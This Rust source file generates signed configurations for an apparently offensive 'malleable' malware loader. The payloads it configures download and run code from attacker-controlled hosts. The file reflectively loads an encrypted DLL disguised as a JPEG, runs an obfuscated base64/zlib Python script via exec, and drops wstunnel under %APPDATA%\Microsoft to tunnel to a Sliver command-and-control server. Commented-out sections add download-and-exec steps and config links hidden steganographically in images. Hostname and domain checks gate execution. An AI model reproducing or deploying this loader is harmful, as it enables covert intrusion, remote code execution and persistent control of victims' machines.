extern crate argparse;

use malleable_rust_loader::config::Config;
use malleable_rust_loader::dataoperation::DataOperation;
//use malleable_rust_loader::defuse::CheckInternet;
use malleable_rust_loader::defuse::Defuse;
use malleable_rust_loader::defuse::DomainJoin;
use malleable_rust_loader::defuse::Hostname;
use malleable_rust_loader::defuse::Operator;
use malleable_rust_loader::link::FileLink;
use malleable_rust_loader::link::HTTPLink;
use malleable_rust_loader::link::Link;
use malleable_rust_loader::link::MemoryLink;
use malleable_rust_loader::payload::DllFromMemory;
use malleable_rust_loader::payload::Exec;
use malleable_rust_loader::payload::ExecPython;
use malleable_rust_loader::payload::Payload;
use malleable_rust_loader::payload::WriteFile;
//use malleable_rust_loader::poollink::Advanced;
use malleable_rust_loader::poollink::PoolLinks;
//use malleable_rust_loader::poollink::PoolMode;

use ring::signature;
use ring::signature::Ed25519KeyPair;
use std::fs;

use malleable_rust_loader::initialloader::initialize_loader;

use argparse::{ArgumentParser, Store, StoreTrue};
use log::error;
use log::info;
extern crate env_logger;

use std::collections::BTreeMap;

fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
    let pkcs8_bytes: Vec<u8> = fs::read(path_file).unwrap();
    signature::Ed25519KeyPair::from_pkcs8(pkcs8_bytes.as_ref()).unwrap()
}

fn main() {
    env_logger::init();
    let mut verbose = false;
    let mut payload = "".to_string();
    let mut output: String = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
    let mut keypair: String = concat!(env!("HOME"), "/.malleable/ed25519.u8").to_string();
    let mut payload_dataope: String =
        concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
    {
        // this block limits scope of borrows by ap.refer() method
        let mut ap = ArgumentParser::new();
        ap.set_description("Generate configuration model for rust malleable loader. You can modify example generated by hand or modify this conf.rs file to fit your need. by Brother🔥");
        ap.refer(&mut payload)
            .add_argument("payload", Store, "choose a payload to generate the config, valid choice: banner windlexec dll py file memdll");
        ap.refer(&mut verbose)
            .add_option(&["-v", "--verbose"], StoreTrue, "Be verbose");
        ap.refer(&mut output).add_option(
            &["--output"],
            Store,
            "config output path, default: /.malleable/config/initial.json",
        );
        ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
        ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
        ap.parse_args_or_exit();
    }
    let json_file = format!("{output}");
    info!("[+] You choose payload type: {}", payload);

    let payload_choice: Vec<Payload>;

    if payload == "banner".to_string() {
        info!("[+] Loader type choice: Banner");
        payload_choice = vec![Payload::Banner()];
    } else if payload == "lindlexec".to_string() {
        info!("[+] Loader type choice: DownloadAndExec linux");
        todo!();
        /*
        payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://delivery.flameshot.space/nologin/sliv_linux"),
                dataoperation: vec![],
                jitt: 0,
                sleep: 0,
            }),
            out_filepath: String::from("/tmp/sliv_linux"),
            out_overwrite: false,
            exec_cmdline: String::from(""),
        })];
        */
    } else if payload == "windlexec".to_string() {
        info!("[+] Loader type choice: DownloadAndExec windows");
        todo!();
        /*
        payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://delivery.flameshot.space/nologin/exe_slivperso.exe"),
                dataoperation: vec![],
                jitt: 0,
                sleep: 0,
            }),
            out_filepath: String::from("C:\\Users\\user\\AppData\\Roaming\\exe_slivperso.exe"),
            //TODO ce serait cool
            //out_filepath: String::from("%appdata%\\exe_slivperso.exe"),
            out_overwrite: false,
            exec_cmdline: String::from(""),
        })];
        */
    } else if payload == "dll".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::HTTP(HTTPLink {
                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "py".to_string() {
        info!("[+] Loader type choice: ExecPython");
        payload_choice = vec![Payload::ExecPython( 
            ExecPython{
                    link: Link::HTTP(HTTPLink{
                        url:String::from("https://www.python.org/ftp/python/3.10.10/python-3.10.10-embed-amd64.zip"),
                        dataoperation: vec![
                        ],        
                        jitt:0,
                        sleep:0
                    }),
                    out_filepath:String::from("C:\\Temp\\python-3.10.10-embed-amd64\\"),
                    out_overwrite:false,
                    python_code:String::from("
import base64
import zlib
encoded_script='eNqtWHtz2kgS/3v1KfqcyklKZJmXAXtD6jDIts4YKJDjSyVeSogB5iIkrSRsk3t89uuekRA2jrdytSqXpenp/vVrpmcaVVWV9jpdhvEp/C1wvyWbADRPh0qpUlWULku8mEcpD4NTGG5id8VnsApna58Be2TemmbAi90ZEtIQZuFD4IfuzIAZ8+JNlIIbzDJOBjw4XLFVGG9MUJROGG1ivlimUtWQxSueJATHE1iymE03sIjdIGWINo8Zg3AO3tKNF8wgVW6wgYjFCQqE09TlAQ8W4IKHsMSZLhEmCefpgxszYYWbJKHHXcRDM731igWpK8yfc58loKVLBgfjTOJANxTyh7k+mg00l0/BA8dwrVOIWZLG3CMMA5k8fz0jG/Jpn694poHEha8JWb5O0AOy06BQ8jm9mXArWk99niwxepygpxg0AxIieixAKQX9OApjSJjvEwJHu4WvhXWG8BW1RBTQNAuR0PuwDFdPPcEQzddxgCrZTKYPQyY0/pN5KVGIfR76fvhArnlhMOPkUXKqODjjTsN7JlyRmQzCFC2VFlD8oyKp2VSydNH0KcvihWoxuu6ONzFpT1LMO8fQR2Es1D330lScSwvGg3Pntj2ywB7DcDT4ZHetLhy0xzg+MODWdi4HNw4gx6jddz7D4Bza/c9wZfe7Blj/GI6s8RgGI7Cvhz3bQprd7/Ruunb/As5Qrj9woGdf2w6COgMghRmUbY0J7NoadS5x2D6ze7bz2VDObadPmOcI2oZhe+TYnZteewTDm9FwMLZQfRdh+3b/fIRarGur75ioFWlgfcIBjC/bvZ5Q1b5B60fCvs5g+HlkX1w6cDnodS0knlloWfusZ0lV6FSn17avDaXbvm5fWEJqgCgjwSatg9tLS5BQXxv/Oo496JMbnUHfGeHQQC9Hzlb01h5bBrRH9pgCcj4aXBtA4USJgQBBub4lUSjUsJsRBVlofINOb23pWu0eYo1JeJfZVFQsQgpfUbYBF/7aS/PROvZ9PjVj9vsad1tOnboJq9e2Eomffy7dZIn8ivLmzRu4sPrWqN0jQ8/tC0DSG0XBzRdP3AVufmiBeh1+577vHh2bJdBueYD1KwHMQ7lkln4FJNRrv8JjvaZDO4p8dsumVzw9Oq42zGodtKtL57pn4Eb/xuCCed9CHTrLOFyxo+OmWTKrpcqJWS6XYOzO3ZhLMVWJZBmdyDLaUvF9OF2a0UaVZju0c3CnzfmCNiiaymJRtbAg5iUYnbhnMawj3Fm4WeJ0HYldR4GZAZXkcLUigs8DBgt+zwKBjatqcCjjQssa11X72u7uRAiTJNf8SNkaKpW11OOyWUbHGviqlgs/KPAttVkqKBTjlppiwuhrhxNLMPqL0Zj7PnOnPvt7ozmplk6ak8lJrVJqqgoLxLGBe76lYrHHv0pplyohLq7ak+GF+/3TsHbilufuEKloUS5gf2pN1XKlWjuuN5qF+mWaRi2V/icCMpyxSYY8wXXWUo/8cMGDo/0URRss6YE8uyTND4NFzFBdkTcLN/dO9JQZm0MO/xC7ERZDbeamrgGFO/qpAvjw+Q4NWrgwH8NYlXP04Emz9tMWEvcQKCCmdEbT9R2JFAt7JiiozN/Xso3wnqqM8XV1RhHwH2j+RYahMPwb22Q+I43NJkTFjfjlTsYBP0via44HAc1NphtxcRCDwkp0hcMH8FmgFYj5I5GFYGsH5DdS/oXfvcBLTCZlKJhphbT+hJPD+xaUtyTmJ+wn1Jb+f7W51iywxJJoBYBkF2HecObPJnlSJsgzwWrK3BUFCa8o93jDCBNxgLdKImgHBwcXWX0R5+sjnb9CRFxjBK2zdDuEBx6P8F5moowiMoBHOhYoHtBp7TEth6a7UJqlJHZ5wsDZRMyK4zCWcjkj/BX+W3qcZ8+uwCfXX0sJTR3m3FgLSeMa0asVU9VfNEI4KkL0mgXPhCgwfyiTrzX4SwuqlZetLTj5vWBs/oAPqZSwOMQLItNQvZerlknWtHv48AGpGKMiRDr8G+7h40fQqhU4xNkc5/c1HgF4rsXhmpYS3gHRIQTFi2S+2764d7iSNPF+j8Pp3VPsjGtGXJlZYvSbEDWgXNczFi8D8iTQ7GWg6ROgqQTyCKii/zkWNf8kgxoijF76SHWodAfv0FdJ+HJaE9DlerXWqJeapWPUetygz0bTwL6lWq81GnjOoFeNk0aleVypijCRbA1O0VeSlzcac43F0/umqR+aPVUWwoxTcomvKn3l+yOfFkj1l5B6hIRLDTkfltjFQDnLNvJiI5FqKK9v6ymnOood1YJp1W3J3Fs6JQPQH2gWmXqBqWwAxgJO8Kv6Q6aKAXVkQMBy7YdMVUwAMiBg+Vh/xabjDOn4NZvqGVLlNZsamXfV12yqZd7VivB5FL4sA1n8y3VKwDttW7FxZXFahZQ3/mwdPs8B7ih9mwZRusETo2JNaPnneyi/sKix1mx58eDMsYqVpOWf+/JP7ifF4UzLqdUPA/bSUWFJbtDocJb9vf7z54TU9Yf1lt9TxSdTsjvSPTo0Vb+WVNyhzYznlcKfKUZ6Hpf9s+WKbUgJW0XpRp4oT0v9h22lB8CL+aA70KIUFUA3JGAMQszvZYsvwjA8u+qeV0QTi10AtsDYMyd8xX03NjMYEsPE0OudqONHR4U+SpP+5bRaudsz5eOOKS87koYh0LWUHFGeXRdcrHZTsQAp9LgGM6TvPMry8RN3B317z3z2WmDXkrJH6qywJzPH415HEjQaYofuDDqD3sTpjScd7Lj7jr4VMb0lNlCTZZikgbuiG9S5izesYh47ED7f0I2cZfAda+RMsJu2FCVrD3Hiab9ojuRb220BMMrq6dGR+h6eNjiCrkJBFh3le9jvFJD49cklTT6yKzWn9Vp2QdaeX/+1p42FXtykd3sCXTdxdxFdXafzw6aK01+VX/ABWDIXF13S+pd6g1YftqmRVU+h6Gr/oyvSDvoBCZdfa98suSTUt8np20SFt6Dt9m0G7HZruqG6ice5iinPY+rOMI7CDO1A/nLIv4s9cGDAwZmbcA/eJgeIu2vHc490Shp1CPs5w2GIV2ItG9NPZWIJtPK1oCuRu6FfGVsSAiXdmSaoqKX1POgZs7ETYYV+kdQk/75l/wPXN3T0'
decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
exec(decoded_script)
\0"),
                    thread:false

            }
        )];
    } else if payload == "file".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD] from file");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::FILE(FileLink {
                file_path: String::from("C:\\dll\\malldll.dll.aead"),
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "memdll".to_string() {
        info!("[+] Loader type choice: DllFromMemory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 1,
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })];
    } else if payload == "wstunnel".to_string() {
        // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
        // cargo run --bin encrypt_payload ~/.malleable/payload/wstunnel.exe
        // cargo run --bin conf wstunnel --payload-dataop ~/.malleable/payload/wstunnel.exe.dataop
        // cp ~/.malleable/payload/wstunnel.exe.aead ../config/mem1
        // winrust loader --mem1 --mem2 --debug
        // root@sliver:~# ./wstunnel server --tls-certificate /etc/letsencrypt/live/sliverperso.kaboum.xyz/fullchain.pem --tls-private-key /etc/letsencrypt/live/sliverperso.kaboum.xyz/privkey.pem wss://[::]:8080

        info!("[+] Loader type choice: WriteFile Wstunnel from memory [AEAD]");
        let payload_dataoperation: Vec<DataOperation> =
            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
        payload_choice = vec![
            Payload::WriteFile(WriteFile {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 1,
                dataoperation: payload_dataoperation,
                jitt: 0,
                sleep: 0,
            }),
            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
            hash:"7fba14e73eab7f6595bc35e99c3fb0d5a04006bc20eee7a3389198bbd896cff42d006c3ecb952a78945da72f7d1d8942bd5314b00abe24fb38c3a9e03862b025".to_string(),
        }),
        Payload::Exec(Exec {
            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\wstunnel.exe"),
            cmdline:String::from("client -L tcp://127.0.0.1:1080:127.0.0.1:10 --connection-min-idle 5 wss://sliverperso.kaboum.xyz:8080"),
            thread:true
        }),
        Payload::WriteFile(WriteFile {
            link: Link::HTTP(HTTPLink{
                url:String::from("https://kaboum.xyz/artdonjon/local_mtls_1080.exe"),
                dataoperation: vec![],        
            jitt:0,
            sleep:0        }),
            path: "${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe".to_string(),
            hash:"925a219710f4f01044844817192c916aa8d0107cb940212336a33a37387ccdcda624164de1fed1f18ce21c1fc316ff5db5aa891d3b3b59d7b28b9a71ee12da3d".to_string(),
         }),

        /* 
        Payload::Exec(Exec {
            path: String::from("${APPDATA}\\Microsoft\\wstunn3\\local_mtls_1080.exe"),
            cmdline:String::from(""),
            thread:false
        }),
*/

        Payload::DllFromMemory(DllFromMemory {
            link: Link::MEMORY(MemoryLink {
                memory_nb: 2,
                dataoperation: vec![],
                jitt: 0,
                sleep: 0,
            }),
            dll_entrypoint: String::from("DllInstall"),
            thread: true,
        })

        ];
    } else {
        error!(
            r#"You must choose a payload, from:
- banner
- dll
- py
- file
- memdll"#
        );
        panic!()
    }
    let solar_distance: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
    /*
    let solar_distance: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([
            (
                1,
                (
                    "kaboum.xyz first links".to_string(),
                    PoolLinks {
                        pool_mode: PoolMode::ADVANCED(Advanced {
                            random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
                            max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
                            parallel: true, // try to fetch every link in the same time, if not its one by one
                            linear: true,   // fetch link in the order or randomized
                            stop_same: false, // stop if found the same conf -> not for parallel
                            stop_new: false, // stop if found a new conf -> not for parallel
                            accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
                        }),
                        pool_links: vec![
                            Link::HTTP(HTTPLink {
                                url: String::from("https://kaboum.xyz/artdonjon/gobelin.html"),
                                dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
                                jitt: 0,
                                sleep: 0,
                            }),
                            Link::HTTP(HTTPLink {
                                url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
                                dataoperation: vec![DataOperation::STEGANO],
                                jitt: 0,
                                sleep: 0,
                            }),
                            Link::HTTP(HTTPLink {
                                url: String::from("https://kaboum.xyz/artdonjon/troll4.png"),
                                dataoperation: vec![DataOperation::STEGANO],
                                jitt: 0,
                                sleep: 0,
                            }),
                            Link::HTTP(HTTPLink {
                                url: String::from("https://kaboum.xyz/artdonjon/troll1.png"),
                                dataoperation: vec![DataOperation::STEGANO],
                                jitt: 0,
                                sleep: 0,
                            }),
                            Link::HTTP(HTTPLink {
                                url: String::from("https://kaboum.xyz/artdonjon/troll2.png"),
                                dataoperation: vec![DataOperation::STEGANO],
                                jitt: 0,
                                sleep: 0,
                            }),
                        ],
                    },
                ),
            ),
            (
                2,
                (
                    "backup 1".to_string(),
                    PoolLinks {
                        pool_mode: PoolMode::SIMPLE,
                        pool_links: vec![Link::HTTP(HTTPLink {
                            url: String::from("https://kaboum.xyz/artdonjon/backup1.html"),
                            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
                            jitt: 0,
                            sleep: 0,
                        })],
                    },
                ),
            ),
            (
                3,
                (
                    "backup 2".to_string(),
                    PoolLinks {
                        pool_mode: PoolMode::SIMPLE,
                        pool_links: vec![Link::HTTP(HTTPLink {
                            url: String::from("https://kaboum.xyz/artdonjon/backup2.html"),
                            dataoperation: vec![DataOperation::WEBPAGE, DataOperation::BASE64],
                            jitt: 0,
                            sleep: 0,
                        })],
                    },
                ),
            ),
        ]);
    }

    ;*/

    // payload is define, now, CREATE the
    info!("[+] LOAD ed25519 keypair from {:?}", keypair);
    let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);

    let loaderconf = Config::new_signed(
        &key_pair_ed25519,
        solar_distance,
        payload_choice,
        vec![ /* Defuse::CheckInternet(CheckInternet {
            list: vec![
                "https://www.microsoft.com".to_string(),
                "https://google.com".to_string(),
                "https://login.microsoftonline.com".to_string(),
            ],
            operator: Operator::AND,
        })*/],
        vec![
            Defuse::Hostname(Hostname {
                list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
                operator: Operator::OR,
            }),
            Defuse::DomainJoin(DomainJoin {
                list: vec!["sevenkingdoms.local".to_string(), "essos.local".to_string()],
                operator: Operator::AND,
            }),
        ],
        0,
        0,
    );
    //info!("{:?}", loaderconf);
    info!("[+] SIGN loader");

    info!("[+] Serialized loader configuration: {json_file}");
    loaderconf.serialize_to_file_pretty(&json_file);

    initialize_loader(loaderconf, json_file);
}
